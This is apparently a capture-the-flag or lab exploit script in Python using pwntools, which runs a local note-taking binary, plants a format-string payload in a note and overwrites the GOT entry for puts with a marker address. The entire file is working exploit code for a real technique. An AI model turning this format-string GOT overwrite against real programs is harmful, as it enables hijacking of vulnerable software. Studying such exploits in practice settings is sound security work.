#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

def write_note(idx, title, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", title)
    io.sendlineafter(b": ", content)

def read_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Title:\n")
    title = io.recvline()
    io.recvuntil(b"Content:\n")
    content = io.recvline()
    return title, content

io = process(exe.path)

addr_marker = 0x40157a

#Offset found with gdb
offset = 34

#Injecting string to overwrite GOT entry "puts" wuth marker
write_note(1, b"a", fmtstr_payload(offset, {exe.got["puts"] : addr_marker}))
read_note(1)

#Menu will call puts

io.wait_for_close()

print(io.poll())

exit(io.poll())

#GOT Overwrite